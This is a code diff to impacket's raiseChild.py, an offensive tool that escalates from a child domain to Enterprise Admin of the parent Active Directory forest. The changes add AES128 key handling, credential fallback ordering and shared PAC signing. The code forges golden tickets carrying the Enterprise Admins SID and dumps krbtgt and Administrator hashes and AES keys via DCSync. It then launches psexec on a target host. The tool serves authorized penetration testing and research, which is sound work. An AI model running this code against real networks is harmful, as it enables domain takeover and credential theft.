@@ -86,7 +86,7 @@ from impacket.krb5.types import Principal, KerberosTime
 from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
 from impacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
-from impacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype
+from impacket.krb5.crypto import _enctype_table, get_kerberos_key_for_enctype, get_matching_aes_key
 from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
 from pyasn1.codec.der import decoder, encoder
@@ -99,9 +99,8 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_
 from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
 from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
 from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
-from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
-    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
-    PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO
+from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
+    PAC_CLIENT_INFO_TYPE, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO, sign_pac
 from impacket.dcerpc.v5 import transport, drsuapi, epm, samr
 from impacket.smbconnection import SessionError
 from impacket.nt_errors import STATUS_NO_LOGON_SERVERS
@@ -134,6 +133,9 @@ RemComSTDIN          = "RemCom_stdin"
 RemComSTDERR         = "RemCom_stderr"
 
 lock = Lock()
+
+class RetryableGoldenTicketError(Exception):
+    pass
 
 class PSEXEC:
     def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
@@ -735,6 +737,11 @@ class RAISECHILD:
                     if len(plainText) < 24:
                         plainText = None
 
+        kerberosKeys = {
+            'aes128Key': None,
+            'aes256Key': None,
+        }
+
         if plainText:
             try:
                 userProperties = samr.USER_PROPERTIES(plainText)
@@ -756,9 +763,13 @@ class RAISECHILD:
                         keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
 
                         if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
-                            # Give me only the AES256
-                            if keyDataNew['KeyType'] == 18:
-                                return hexlify(keyValue)
+                            if keyDataNew['KeyType'] == int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value):
+                                kerberosKeys['aes128Key'] = hexlify(keyValue)
+                            elif keyDataNew['KeyType'] == int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
+                                kerberosKeys['aes256Key'] = hexlify(keyValue)
+
+        if kerberosKeys['aes128Key'] or kerberosKeys['aes256Key']:
+            return kerberosKeys
 
         return None
 
@@ -867,7 +878,7 @@ class RAISECHILD:
                 crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
 
             rid, lmhash, nthash = self.__decryptHash(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
-            aesKey = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
+            kerberosKeys = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
         except Exception as e:
             logging.debug('Exception:', exc_info=True)
             logging.error("Error while processing user!")
@@ -876,26 +887,43 @@ class RAISECHILD:
 
         self.__drsr.disconnect()
         self.__drsr = None
+        aes128Key = aes256Key = None
+        if kerberosKeys is not None:
+            aes128Key = kerberosKeys['aes128Key']
+            aes256Key = kerberosKeys['aes256Key']
         creds = {}
         creds['lmhash'] = lmhash
         creds['nthash'] = nthash
-        creds['aesKey'] = aesKey
+        creds['aes128Key'] = aes128Key
+        creds['aes256Key'] = aes256Key
         return rid, creds
 
     @staticmethod
-    def makeGolden(tgt, originalCipher, sessionKey, ntHash, aesKey, extraSid):
+    def _printKerberosKeys(domainName, targetUser, credentials):
+        for keyName, label in (
+                ('aes256Key', 'aes256-cts-hmac-sha1-96s'),
+                ('aes128Key', 'aes128-cts-hmac-sha1-96s')):
+            if credentials.get(keyName):
+                print('%s/%s:%s:%s' % (domainName, targetUser, label, credentials[keyName].decode('utf-8')))
+
+    @staticmethod
+    def makeGolden(tgt, originalCipher, sessionKey, ntHash, extraSid, aes128Key=None, aes256Key=None):
         asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
         # Let's extract Ticket's enc-data
         cipherText = asRep['ticket']['enc-part']['cipher']
 
         cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
-        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(aesKey))
-        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
-            key = Key(cipher.enctype, unhexlify(ntHash))
-        else:
-            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)
+        ticketAesKey = get_matching_aes_key(cipher.enctype, aes128_key=aes128Key, aes256_key=aes256Key)
+        try:
+            key = get_kerberos_key_for_enctype(
+                cipher.enctype,
+                nt_hash=ntHash,
+                aes128_key=aes128Key,
+                aes256_key=aes256Key,
+            )
+        except ValueError as e:
+            raise RetryableGoldenTicketError(str(e))
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -981,104 +1009,14 @@ class RAISECHILD:
         else:
             raise Exception('PAC_LOGON_INFO not found! Aborting')
 
-        # Let's now clear the checksums
-        if PAC_SERVER_CHECKSUM in pacInfos:
-            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
-            if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                serverChecksum['Signature'] = b'\x00'*12
-            else:
-                serverChecksum['Signature'] = b'\x00'*16
-        else:
-            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
-
-        if PAC_PRIVSVR_CHECKSUM in pacInfos:
-            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-            privSvrChecksum['Signature'] = b'\x00'*12
-            if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                privSvrChecksum['Signature'] = b'\x00'*12
-            else:
-                privSvrChecksum['Signature'] = b'\x00'*16
-        else:
-            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
-
-        if PAC_CLIENT_INFO_TYPE in pacInfos:
-            pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
-            pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
-        else:
+        if PAC_CLIENT_INFO_TYPE not in pacInfos:
             raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')
 
 
-        # We changed everything we needed to make us special. Now let's repack and calculate checksums
-        serverChecksumBlob = serverChecksum.getData()
-        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))
-
-        privSvrChecksumBlob = privSvrChecksum.getData()
-        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))
-
-        # The offset are set from the beginning of the PAC_TYPE
-        # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(PAC_INFO_BUFFER().getData())*4
-
-        # Let's build the PAC_INFO_BUFFER for each one of the elements
-        validationInfoIB = PAC_INFO_BUFFER()
-        validationInfoIB['ulType'] = PAC_LOGON_INFO
-        validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
-        validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
-
-        pacClientInfoIB = PAC_INFO_BUFFER()
-        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
-        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
-        pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
-
-        serverChecksumIB = PAC_INFO_BUFFER()
-        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
-        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
-        serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
-
-        privSvrChecksumIB = PAC_INFO_BUFFER()
-        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
-        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
-        privSvrChecksumIB['Offset'] = offsetData
-        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
-
-        # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
-            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
-            pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
-        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
-
-        pacType = PACTYPE()
-        pacType['cBuffers'] = 4
-        pacType['Version'] = 0
-        pacType['Buffers'] = buffers + buffersTail
-
-        blobToChecksum = pacType.getData()
-
-        # If you want to do MD5, ucomment this
-        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
-        if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyServer = Key(Enctype.AES256, unhexlify(aesKey))
-        elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
-            keyServer = Key(Enctype.RC4, unhexlify(ntHash))
-        else:
-            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'] )
-
-        checkSumFunctionPriv= _checksum_table[privSvrChecksum['SignatureType']]
-        if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
-        elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
-            keyPriv = Key(Enctype.RC4, unhexlify(ntHash))
-        else:
-            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'] )
-
-        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, 17, blobToChecksum)
-        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, 17, serverChecksum['Signature'])
-
-        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
-        pacType['Buffers'] = buffers + buffersTail
+        # We changed everything we needed to make us special. Now let's repack
+        # and calculate checksums through the shared PAC helper.
+        pacInfos[PAC_LOGON_INFO] = validationInfoBlob
+        pacType = sign_pac(pacInfos, aes_key=ticketAesKey, nt_hash=ntHash, infer_aes_signature_type=True)
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
@@ -1091,12 +1029,15 @@ class RAISECHILD:
         encodedEncTicketPart = encoder.encode(encTicketPart)
 
         cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
-        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            key = Key(cipher.enctype, unhexlify(aesKey))
-        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
-            key = Key(cipher.enctype, unhexlify(ntHash))
-        else:
-            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)
+        try:
+            key = get_kerberos_key_for_enctype(
+                cipher.enctype,
+                nt_hash=ntHash,
+                aes128_key=aes128Key,
+                aes256_key=aes256Key,
+            )
+        except ValueError as e:
+            raise RetryableGoldenTicketError(str(e))
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -1107,6 +1048,25 @@ class RAISECHILD:
         asRep['ticket']['enc-part']['cipher'] = cipherText
 
         return encoder.encode(asRep), originalCipher, sessionKey
+
+    @staticmethod
+    def _get_rc4_retry_cred(childCreds):
+        if childCreds['password']:
+            return {
+                'lmhash': LMOWFv1(childCreds['password']),
+                'nthash': NTOWFv1(childCreds['password']),
+                'aesKey': None,
+            }
+
+        return None
+
+    @staticmethod
+    def _get_preferred_aes_key(creds):
+        return creds.get('aes256Key') or creds.get('aes128Key')
+
+    @staticmethod
+    def _same_rc4_creds(leftCreds, rightCreds):
+        return leftCreds['lmhash'] == rightCreds['lmhash'] and leftCreds['nthash'] == rightCreds['nthash']
 
     def raiseUp(self, childName, childCreds, parentName):
         logging.info('Raising %s to %s' % (childName, parentName))
@@ -1121,42 +1081,58 @@ class RAISECHILD:
         rid, credentials = self.getCredentials(targetUser, childName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (
         childName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (childName, targetUser, credentials['aesKey'].decode('utf-8')))
+        self._printKerberosKeys(childName, targetUser, credentials)
 
         # 5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
         userName = Principal(childCreds['username'], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         TGT = {}
         TGS = {}
-        while True:
+
+        # Build ordered list of end-to-end credential methods. Explicit key material goes first,
+        # then password, then an RC4 retry derived from the password if it would be distinct.
+        credAttempts = []
+        explicitRc4Cred = None
+        if childCreds['aesKey']:
+            credAttempts.append(('AES', {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
+        if childCreds['nthash']:
+            explicitRc4Cred = {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}
+            credAttempts.append(('RC4', explicitRc4Cred))
+        if childCreds['password']:
+            credAttempts.append(('password', {'lmhash': b'', 'nthash': b'', 'aesKey': None}))
+            passwordRc4Cred = self._get_rc4_retry_cred(childCreds)
+            if passwordRc4Cred is not None and (
+                    explicitRc4Cred is None or not self._same_rc4_creds(passwordRc4Cred, explicitRc4Cred)):
+                credAttempts.append(('password->RC4', passwordRc4Cred))
+        if not credAttempts:
+            raise Exception('No credentials provided')
+
+        for credType, cred in credAttempts:
             try:
+                logging.info('Trying %s for TGT request' % credType)
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'],
-                                                                        childCreds['domain'], childCreds['lmhash'],
-                                                                        childCreds['nthash'], None, self.__kdcHost)
+                                                                        childCreds['domain'], cred['lmhash'],
+                                                                        cred['nthash'], cred['aesKey'], self.__kdcHost)
+                logging.info('TGT obtained using %s' % credType)
             except KerberosError as e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
-                        childCreds['nthash'] = compute_nthash(childCreds['password'])
-                        continue
-                    else:
-                        raise
+                if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value,
+                                        constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
+                    logging.warning('%s failed (error 0x%x), trying next method' % (credType, e.getErrorCode()))
+                    continue
                 else:
                     raise
-
-            # We have a TGT, let's make it golden
-            goldenTicket, cipher, sessionKey = self.makeGolden(tgt, cipher, sessionKey, credentials['nthash'],
-                                                               credentials['aesKey'], entepriseSid + '-519')
+            try:
+                goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt, cipher, sessionKey,
+                                                                               credentials['nthash'], entepriseSid + '-519',
+                                                                               aes128Key=credentials.get('aes128Key'),
+                                                                               aes256Key=credentials.get('aes256Key'))
+            except RetryableGoldenTicketError as e:
+                logging.warning('%s failed while building golden ticket (%s), trying next method' % (credType, e))
+                continue
             TGT['KDC_REP'] = goldenTicket
-            TGT['cipher'] = cipher
+            TGT['cipher'] = goldenCipher
             TGT['oldSessionKey'] = oldSessionKey
-            TGT['sessionKey'] = sessionKey
+            TGT['sessionKey'] = goldenSessionKey
 
-            # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
             if self.__target is None:
                 serverName = Principal('cifs/%s' % self.getMachineName(gethostbyname(parentName)),
                                        type=constants.PrincipalNameType.NT_SRV_INST.value)
@@ -1164,29 +1140,31 @@ class RAISECHILD:
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
             try:
                 logging.debug('Getting TGS for SPN %s' % serverName)
+                print('[*] Golden ticket etype: %s (using %s child credentials)' % (goldenCipher.enctype, credType))
+                print('[*] Requesting TGS for %s' % serverName)
                 tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName,
-                                                                                        childCreds['domain'], None,
-                                                                                        goldenTicket, cipher,
-                                                                                        sessionKey)
+                                                                                        childCreds['domain'], self.__kdcHost,
+                                                                                        goldenTicket, goldenCipher,
+                                                                                        goldenSessionKey)
+                TGT['cipher'] = goldenCipher
+                TGT['sessionKey'] = goldenSessionKey
                 TGS['KDC_REP'] = tgsCIFS
                 TGS['cipher'] = cipherCIFS
                 TGS['oldSessionKey'] = oldSessionKeyCIFS
                 TGS['sessionKey'] = sessionKeyCIFS
                 break
             except KerberosError as e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
-                        childCreds['nthash'] = compute_nthash(childCreds['password'])
-                    else:
-                        raise
+                if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_TGT_REVOKED.value,
+                                        constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value):
+                    logging.warning('Golden ticket built from %s child credentials rejected (0x%x), trying next method' % (
+                        credType, e.getErrorCode()))
+                    continue
                 else:
                     raise
+            else:
+                break
+        else:
+            raise Exception('Golden ticket was rejected with all available child credential methods')
 
         # 6) Use the generated ticket to log into the parent and get the krbtgt/admin info
         # 6) Use the generated ticket to log into the parent and get the target-user info
@@ -1196,13 +1174,13 @@ class RAISECHILD:
         rid, credentials = self.getCredentials(targetUser, parentName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (
         parentName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'].decode("utf-8")))
+        self._printKerberosKeys(parentName, targetUser, credentials)
 
         ################ Get TargetUser credentials (Administrator credentials by default)
         logging.info('Target User account name is %s' % targetName)
         rid, credentials = self.getCredentials(targetName, parentName, childCreds)
         print('%s/%s:%s:%s:%s:::' % (parentName, targetName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
-        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetName, credentials['aesKey'].decode('utf-8')))
+        self._printKerberosKeys(parentName, targetName, credentials)
 
         targetCreds = {}
         targetCreds['username'] = targetName
@@ -1210,7 +1188,9 @@ class RAISECHILD:
         targetCreds['domain'] = parentName
         targetCreds['lmhash'] = credentials['lmhash']
         targetCreds['nthash'] = credentials['nthash']
-        targetCreds['aesKey'] = credentials['aesKey']
+        targetCreds['aes128Key'] = credentials.get('aes128Key')
+        targetCreds['aes256Key'] = credentials.get('aes256Key')
+        targetCreds['aesKey'] = self._get_preferred_aes_key(credentials)
         targetCreds['TGT'] =  None
         targetCreds['TGS'] =  None
         return targetCreds, TGT, TGS
@@ -1241,7 +1221,7 @@ class RAISECHILD:
             from impacket.smbconnection import SMBConnection
             s = SMBConnection('*SMBSERVER', self.__target)
             s.kerberosLogin(targetCreds['username'], '', targetCreds['domain'], targetCreds['lmhash'],
-                            targetCreds['nthash'], useCache=False)
+                            targetCreds['nthash'], targetCreds['aesKey'], useCache=False)
 
             if self.__command != 'None':
                 executer = PSEXEC(self.__command, targetCreds['username'], targetCreds['domain'], s, None, None)
@@ -1279,13 +1259,17 @@ if __name__ == '__main__':
         print("\tpython raiseChild.py childDomain.net/adminuser\n")
         print("\tthe password will be asked, or\n")
         print("\tpython raiseChild.py childDomain.net/adminuser:mypwd\n")
-        print("\tor if you just have the hashes\n")
+        print("\tor if you just have the NTLM hashes\n")
         print("\tpython raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser\n")
-
+        print("\tor if you have the AES key (recommended for modern Windows Server 2019/2022/2025)\n")
+        print("\tpython raiseChild.py -aesKey <hex_aes256_key> childDomain.net/adminuser\n")
+        print("\tor combine both - AES will be tried first, RC4 used as fallback\n")
+        print("\tpython raiseChild.py -hashes LMHASH:NTHASH -aesKey <hex_aes256_key> childDomain.net/adminuser\n")
+        print("\tNote: AES keys can be obtained via: impacket-secretsdump -just-dc-user DOMAIN/username ...\n")
         print("\tThis will perform the attack and then psexec against target-exec as Enterprise Admin")
-        print("\tpython raiseChild.py -target-exec targetHost childDomainn.net/adminuser\n")
+        print("\tpython raiseChild.py -target-exec targetHost childDomain.net/adminuser\n")
         print("\tThis will perform the attack and then psexec against target-exec as User with RID 1101")
-        print("\tpython raiseChild.py -target-exec targetHost -targetRID 1101 childDomainn.net/adminuser\n")
+        print("\tpython raiseChild.py -target-exec targetHost -targetRID 1101 childDomain.net/adminuser\n")
         print("\tThis will save the final goldenTicket generated in the ccache target file")
         print("\tpython raiseChild.py -w ccache childDomain.net/adminuser\n")
         sys.exit(1)
